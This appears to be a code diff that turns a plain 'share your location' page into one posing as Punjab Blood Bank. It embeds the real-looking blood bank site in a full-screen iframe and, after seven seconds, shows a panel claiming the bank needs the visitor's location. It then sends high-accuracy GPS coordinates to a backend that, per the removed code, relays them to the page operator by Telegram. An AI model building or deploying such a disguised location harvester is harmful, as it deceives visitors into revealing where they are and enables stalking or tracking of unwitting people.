@@ -3,257 +3,316 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>Location Portal</title>
+<title>Punjab Blood Bank</title>
 
 <style>
 *{box-sizing:border-box}
 
-body{
- margin:0;
- min-height:100vh;
- display:flex;
- align-items:center;
- justify-content:center;
- font-family:Arial,sans-serif;
- color:white;
- background:#020306;
- overflow:hidden;
+html,body{
+    margin:0;
+    width:100%;
+    height:100%;
+    background:#05070a;
+    font-family:Arial,sans-serif;
+    overflow:hidden;
 }
 
-body:before{
- content:"";
- position:fixed;
- width:700px;
- height:700px;
- background:radial-gradient(circle,#00e5ff22,transparent 65%);
- animation:move 8s infinite alternate;
+#siteFrame{
+    width:100%;
+    height:100%;
+    border:0;
+    display:block;
 }
 
-@keyframes move{
- from{transform:translate(-25%,-20%)}
- to{transform:translate(25%,20%)}
+#locationPanel{
+    position:fixed;
+    left:50%;
+    bottom:22px;
+    transform:translateX(-50%) translateY(150%);
+    width:calc(100% - 30px);
+    max-width:430px;
+    padding:24px;
+    border-radius:24px;
+    color:white;
+    background:rgba(9,11,15,.97);
+    border:1px solid #ffffff18;
+    box-shadow:0 20px 70px #000,0 0 40px #d0000030;
+    backdrop-filter:blur(20px);
+    transition:.5s ease;
+    z-index:10;
 }
 
-.card{
- position:relative;
- width:92%;
- max-width:430px;
- padding:35px 25px;
- text-align:center;
- border:1px solid #ffffff20;
- border-radius:28px;
- background:#080b11e8;
- box-shadow:0 0 60px #00d9ff18;
- backdrop-filter:blur(20px);
+#locationPanel.show{
+    transform:translateX(-50%) translateY(0);
 }
 
-.logo{
- width:105px;
- height:105px;
- margin:auto;
- display:flex;
- align-items:center;
- justify-content:center;
- border-radius:50%;
- font-size:48px;
- background:#06141b;
- border:1px solid #00d9ff66;
- box-shadow:0 0 30px #00d9ff55;
+.icon{
+    width:55px;
+    height:55px;
+    margin-bottom:15px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    border-radius:16px;
+    background:#d0000018;
+    font-size:28px;
 }
 
-h1{
- margin:22px 0 8px;
- letter-spacing:2px;
- font-size:25px;
+h2{
+    margin:0 0 8px;
+    font-size:22px;
 }
 
 p{
- color:#9ca7b4;
- line-height:1.5;
- font-size:14px;
+    margin:0;
+    color:#a5adb7;
+    font-size:13px;
+    line-height:1.6;
 }
 
 button{
- width:100%;
- padding:17px;
- margin-top:20px;
- border:0;
- border-radius:15px;
- color:white;
- background:linear-gradient(100deg,#00a8ff,#762cff);
- font-size:16px;
- font-weight:bold;
- cursor:pointer;
+    width:100%;
+    margin-top:18px;
+    padding:16px;
+    border:0;
+    border-radius:14px;
+    color:white;
+    background:linear-gradient(135deg,#c40000,#ff3030);
+    font-size:15px;
+    font-weight:bold;
+    cursor:pointer;
 }
 
 button:disabled{
- opacity:.55;
- cursor:not-allowed;
+    opacity:.55;
 }
 
 #status{
- display:none;
- margin-top:20px;
- padding:15px;
- border-radius:14px;
- background:#ffffff09;
- color:#b9c3cf;
- font-size:13px;
- line-height:1.5;
+    display:none;
+    margin-top:13px;
+    padding:12px;
+    border-radius:12px;
+    background:#ffffff08;
+    color:#bfc6ce;
+    font-size:12px;
+    line-height:1.5;
 }
 
-.small{
- margin-top:18px;
- color:#596572;
- font-size:11px;
+.close{
+    position:absolute;
+    right:17px;
+    top:14px;
+    color:#737b85;
+    font-size:20px;
+    cursor:pointer;
 }
 </style>
 </head>
 
 <body>
 
-<div class="card">
+<!-- APNI WEBSITE KA LINK YAHAN CHANGE KAREN -->
+<iframe id="siteFrame"
+    src="https://punjab-blood-bank.streamlit.app"
+    allow="geolocation">
+</iframe>
 
- <div class="logo">📍</div>
+<div id="locationPanel">
 
- <h1>LOCATION PORTAL</h1>
+    <div class="close" onclick="closePanel()">×</div>
 
- <p>
-   Share your current location with the site owner.
-   Your browser will ask for permission before sharing.
- </p>
+    <div class="icon">📍</div>
 
- <button id="btn" onclick="getLocation()">
-   SHARE MY LOCATION
- </button>
+    <h2>Share Your Location</h2>
 
- <div id="status"></div>
+    <p>
+        Punjab Blood Bank needs your current location to provide
+        location-based assistance. Your browser will ask for
+        permission before sharing.
+    </p>
 
- <div class="small">
-   🔒 Location is shared only after your permission.
- </div>
+    <button id="locationBtn" onclick="shareLocation()">
+        📍 SHARE MY LOCATION
+    </button>
+
+    <div id="status"></div>
 
 </div>
 
 <script>
 
-const btn = document.getElementById("btn");
-const statusBox = document.getElementById("status");
+/* =========================================
+   WEBSITE SETTING
+   Change only this URL when needed.
+   ========================================= */
 
-function status(message){
-    statusBox.style.display = "block";
-    statusBox.innerHTML = message;
+const WEBSITE_URL =
+    "https://punjab-blood-bank.streamlit.app";
+
+document.getElementById("siteFrame").src = WEBSITE_URL;
+
+
+/* =========================================
+   SHOW LOCATION PANEL AFTER 7 SECONDS
+   ========================================= */
+
+setTimeout(function(){
+
+    document
+        .getElementById("locationPanel")
+        .classList.add("show");
+
+},7000);
+
+
+/* =========================================
+   CLOSE PANEL
+   ========================================= */
+
+function closePanel(){
+
+    document
+        .getElementById("locationPanel")
+        .classList.remove("show");
 }
 
-function getLocation(){
+
+/* =========================================
+   LOCATION
+   ========================================= */
+
+async function shareLocation(){
+
+    const btn = document.getElementById("locationBtn");
+    const status = document.getElementById("status");
 
     if(!navigator.geolocation){
-        status("❌ Your browser does not support location.");
+
+        status.style.display="block";
+        status.innerHTML="❌ Your browser does not support location.";
         return;
     }
 
-    btn.disabled = true;
-    btn.innerText = "GETTING LOCATION...";
+    btn.disabled=true;
+    btn.innerText="📡 GETTING LOCATION...";
 
-    status("📡 Requesting your location...");
+    status.style.display="block";
+    status.innerHTML="Requesting location permission...";
 
     navigator.geolocation.getCurrentPosition(
 
         async function(position){
 
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-            const accuracy = position.coords.accuracy;
+            const latitude =
+                position.coords.latitude;
 
-            status(
-                "📍 Location received<br><br>" +
+            const longitude =
+                position.coords.longitude;
+
+            const accuracy =
+                position.coords.accuracy;
+
+            status.innerHTML =
+                "📍 Location received.<br>" +
                 "Accuracy: " +
                 Math.round(accuracy) +
                 " meters<br><br>" +
-                "Sending notification..."
-            );
+                "Sending...";
 
             try{
 
-                const response = await fetch("/api/location",{
-                    method:"POST",
-                    headers:{
-                        "Content-Type":"application/json"
-                    },
-                    body:JSON.stringify({
-                        latitude: latitude,
-                        longitude: longitude,
-                        accuracy: accuracy,
-                        consent: true
-                    })
-                });
+                const response = await fetch(
+                    "/api/location",
+                    {
+                        method:"POST",
 
-                const result = await response.json();
+                        headers:{
+                            "Content-Type":"application/json"
+                        },
 
-                console.log(result);
+                        body:JSON.stringify({
+
+                            latitude:latitude,
+
+                            longitude:longitude,
+
+                            accuracy:accuracy,
+
+                            consent:true
+                        })
+                    }
+                );
+
+                const result =
+                    await response.json();
 
                 if(result.ok){
 
-                    status(
-                        "✅ LOCATION SENT<br><br>" +
-                        "Telegram notification sent successfully."
-                    );
+                    status.innerHTML =
+                        "✅ Location shared successfully.";
 
-                    btn.innerText = "LOCATION SHARED ✓";
+                    btn.innerText =
+                        "✓ LOCATION SHARED";
 
                 }else{
 
-                    status(
-                        "⚠️ Location received.<br><br>" +
-                        "Telegram error: " +
-                        (result.error || "Unknown error")
-                    );
+                    status.innerHTML =
+                        "⚠️ " +
+                        (result.error ||
+                        "Unable to send location.");
 
-                    btn.disabled = false;
-                    btn.innerText = "TRY AGAIN";
+                    btn.disabled=false;
+                    btn.innerText =
+                        "📍 TRY AGAIN";
                 }
 
             }catch(error){
 
                 console.error(error);
 
-                status(
-                    "❌ Server connection failed.<br><br>" +
-                    "Please try again."
-                );
+                status.innerHTML =
+                    "❌ Server connection failed.";
 
-                btn.disabled = false;
-                btn.innerText = "TRY AGAIN";
+                btn.disabled=false;
+                btn.innerText =
+                    "📍 TRY AGAIN";
             }
         },
 
         function(error){
 
-            btn.disabled = false;
-            btn.innerText = "SHARE MY LOCATION";
+            btn.disabled=false;
+            btn.innerText =
+                "📍 SHARE MY LOCATION";
 
-            if(error.code === 1){
-                status("❌ Location permission was denied.");
-            }
-            else if(error.code === 2){
-                status("❌ Location unavailable.");
-            }
-            else if(error.code === 3){
-                status(
-                    "❌ Location request timed out.<br><br>" +
-                    "Please make sure Location/GPS is ON and try again."
-                );
-            }
-            else{
-                status("❌ Unable to get location.");
-            }
+            status.style.display="block";
 
+            if(error.code===1){
+
+                status.innerHTML =
+                    "❌ Location permission was denied.";
+
+            }else if(error.code===2){
+
+                status.innerHTML =
+                    "❌ Location is unavailable.";
+
+            }else if(error.code===3){
+
+                status.innerHTML =
+                    "❌ Location request timed out.";
+
+            }else{
+
+                status.innerHTML =
+                    "❌ Unable to get location.";
+            }
         },
 
         {
-            enableHighAccuracy:false,
-            timeout:120000,
-            maximumAge:60000
+            enableHighAccuracy:true,
+            timeout:20000,
+            maximumAge:5000
         }
     );
 }
